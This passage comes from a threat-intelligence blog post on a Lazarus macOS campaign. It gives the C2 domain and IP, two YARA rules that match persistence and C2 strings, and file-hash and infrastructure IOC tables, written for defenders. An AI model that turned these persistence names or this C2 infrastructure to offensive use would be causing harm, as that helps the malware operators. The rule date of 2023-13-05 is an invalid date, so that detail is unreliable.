+<p>The C2 domain in this sample is capitalzeroco[.]com and currently points to the domain 172[.]93[.]201[.]106. It is currently running Microsoft IIS and has RDP exposed. This means that this host is most likely a compromised asset making pivoting off this particular infra difficult.</p>
+<p>The domain was registered on Porkbun which is a favorite of</p>
+<div id="5-appendix" class="anchor"></div>
+<h2 class="relative group">5. Appendix 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#5-appendix" aria-label="Anchor">#</a></span>        
+    
+</h2>
+<div id="51---yara-rules" class="anchor"></div>
+<h3 class="relative group">5.1 - YARA Rules 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#51---yara-rules" aria-label="Anchor">#</a></span>        
+    
+</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="l">rule operation_intercept_macos_stage1 {</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="nt">meta</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="l">description = &#34;Detecting persistence of macOS persistence Lazarus&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="l">author = &#34;@birchb0y&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="l">reference = &#34;&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="l">date = &#34;2023-13-05&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nt">strings</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="l">$persist1 = &#34;com.diagnosticspeer.plist&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="l">$persist2 = &#34;DiagnosticsPeer&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="l">$persist3 = &#34;pgrep -f diageventagent&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="l">$persist4 = &#34;diageventagent_&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="l">$persist5 = &#34;diagevent_&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="l">$persist6 = &#34;diageventagent&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="l">$persist7 = &#34;diageventd.app&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="l">$plist1 = &#34;iTunes_trush&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="l">$plist2 = &#34;OnDemand&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="l">$plist3 = &#34;RunAtLoad&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="l">$plist4 = &#34;KeepAlive&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nt">condition</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="l">any of ($persist*) or all of ($plist*)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span>}<span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">rule operation_intercept_stage2 {</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="nt">meta</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="l">description = &#34;&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="l">author = &#34;@birchb0y&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="l">reference = &#34;&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="l">date = &#34;2023-13-05&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nt">strings</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="l">$string1 = &#34;DiagnosticsPeer&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="l">$string2 = &#34;capitalzeroco.com&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="l">$curl1 = &#34;Mozilla/5.0+(Macintosh;Intel+Mac+OS+X+12_4)+AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="l">$curl2 = &#34;Content-Encoding: application/x-www-form-urlencoded; charset=UTF-8&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nt">condition</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="l">any of ($string*) or all of ($curl*)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span>}<span class="w">
+</span></span></span></code></pre></div><div id="52---iocs" class="anchor"></div>
+<h3 class="relative group">5.2 - IOCs 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#52---iocs" aria-label="Anchor">#</a></span>        
+    
+</h3>
+<p><strong>Files</strong></p>
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th>SHA-256</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CryptoComJobOpportunities.pdf</td>
+<td>8762bd7e0facf8cbfa0e8710d7f2a417d43d946d22b0d7eecb3942569ce57fc0</td>
+</tr>
+<tr>
+<td>diageventagent</td>
+<td>fa1f3254537c9841a62dfee080874d6792186670a0cb59dbc25dda7ca718a3a7</td>
+</tr>
+<tr>
+<td>CryptoComJD.zip</td>
+<td>a34ac35a302ceedcb86301cc1a22caeaf6a48a15b699ed20a02b5c705d6741ec</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Infrastructure</strong></p>
+<table>
+<thead>
+<tr>
+<th>Domain</th>
+<th>IP</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>capitalzeroco[.]com</td>
+<td>172[.]93[.]201[.]106</td>
+</tr>
+</tbody>
+</table>
+
+        </br></br>
+        
+
+      </div>
+     
+     <script>
+        var oid = "views_posts\/crypto-workers-wanted\/index.md"
+        var oid_likes = "likes_posts\/crypto-workers-wanted\/index.md"
+      </script>
+      
+      
+      <script type="text/javascript" src="/js/page.min.0e49973b4ad0a382c7c6012d8bff8226316642daabc4f8a20477bd08674f3da6e2fa993bc20ad4f51e7c5bb68e6f913a207a7c4fe37ea0e7b806894afce0a64e.js" integrity="sha512-DkmXO0rQo4LHxgEti/&#43;CJjFmQtqrxPiiBHe9CGdPPabi&#43;pk7wgrU9R58W7aOb5E6IHp8T&#43;N&#43;oOe4BolK/OCmTg=="></script>
+  
+    </section>
+  <footer class="pt-8 max-w-prose print:hidden">
+
+    
+
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+
+    
+
+    
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="flex group mr-3" href="/posts/lazarus-loves-crypto/">
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Lazarus Using Leaked Hacking Team Tooling</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2022-12-18 17:51:24 -0500 EST">18 December 2022</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+    
+  </footer>
+</article>
+
+      <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
+  <a href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top" title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+    </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+  
+  <div class="flex items-center justify-between">
+
+    
+    
+
+    
+    
+
+  </div>
+  <script>
+    
+    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+      margin: 24,
+      background: 'rgba(0,0,0,0.5)',
+      scrollOffset: 0,
+    })
+    
+  </script>
+  
+  
+  <script type="text/javascript" src="/js/process.min.35c1113bcc16c5a59bf031082f9e63822aa95280423881a7847a7ff33a16e6299ce6a840d9ef4e10d947e030a18f3f20359afb2ec0f35967484b9a9360ac3145.js" integrity="sha512-NcERO8wWxaWb8DEIL55jgiqpUoBCOIGnhHp/8zoW5imc5qhA2e9OENlH4DChjz8gNZr7LsDzWWdIS5qTYKwxRQ=="></script>
+  
+  
+</footer><div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
+  data-url="https://alden.io/"
+  style="z-index:500"
+>
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"
+  >
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0"
+        />
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)"
+      >
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+  </div>
+</body>
+
+</html>
